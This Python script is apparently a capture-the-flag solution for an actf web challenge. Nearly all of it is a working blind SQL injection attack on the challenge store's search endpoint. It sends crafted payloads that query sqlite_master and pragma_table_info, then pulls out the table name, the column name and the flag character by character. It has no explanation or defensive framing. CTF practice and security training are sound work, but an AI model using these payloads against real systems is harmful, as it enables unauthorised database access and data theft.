import requests

url = "https://store.web.actf.co"

result = ""
length_of_table = 43
for i in range(1,60):
    print(i)

    sql = f"' or length((SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'))={i}--"
    print(sql)

    r = requests.post(
            f"{url}/search", 
            data={
                "item": f"{sql}"
            }
    )
    assert r.status_code == 200

    if "<td>Otamatone</td>" in r.text:
        length_of_table = i 
        print(r.text)
        break
       
print("Length of table: ", length_of_table)

table_name = "items,flagsd69197c9018f1d6e853981d5a805846f"
table_name = "flagsd69197c9018f1d6e853981d5a805846f"  
# table_name = "items,"

for i in range(len(table_name) + 1, length_of_table + 1): 
    print(i)
    check = False
    for j in range(48, 58): 
        sql = f"' or substr((SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),{i},1)=char({j})--"
        # sql = f"' or (SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' and tbl_name like 'items') --"
        print(sql)
        r = requests.post(
                f"{url}/search", 
                data={
                    "item": f"{sql}"
                }
        )
        assert r.status_code == 200

        if "<td>Otamatone</td>" in r.text:
            table_name += chr(j)
            print(table_name) 
            check = True
            break
    
    if check : continue 

    for j in range(97, 128): 
        sql = f"' or substr((SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),{i},1)=char({j})--"
        # sql = f"' or (SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' and tbl_name like 'items') --"
        print(sql)
        r = requests.post(
                f"{url}/search", 
                data={
                    "item": f"{sql}"
                }
        )
        assert r.status_code == 200

        if "<td>Otamatone</td>" in r.text:
            table_name += chr(j)
            print(table_name) 
            break

print("Table name: ", table_name)
column_name = "flag" #"id,name,detail" # items
for i in range(len(column_name) + 1, 50): 
    print(i)
    check = False
    for j in range(32, 128): 
        sql = f"' or substr((SELECT group_concat(name) AS column_names FROM pragma_table_info('{table_name}')),{i},1)=char({j})--"
        print(sql)
        r = requests.post(
            f"{url}/search", 
            data={
                "item": f"{sql}"
            }
        )
        assert r.status_code == 200

        if "<td>Otamatone</td>" in r.text:
            check = True 
            column_name += chr(j)
            print(column_name) 
            break

    if check == False:
        break 

flag = "actf{"
for i in range(len(flag) + 1, 50): 
    print(i)
    check = False
    for j in "{}0123456789abcdefghijklmnopqrstuvwxyz": 
        sql = f"' or substr((SELECT {column_name} FROM {table_name}),{i},1)='{j}'--"
        print(sql)
        r = requests.post(
            f"{url}/search", 
            data={
                "item": f"{sql}"
            }
        )
        assert r.status_code == 200

        if "<td>Otamatone</td>" in r.text:
            check = True 
            flag += (j)
            print(flag) 
            break

    if check == False: 
        break 

print(flag)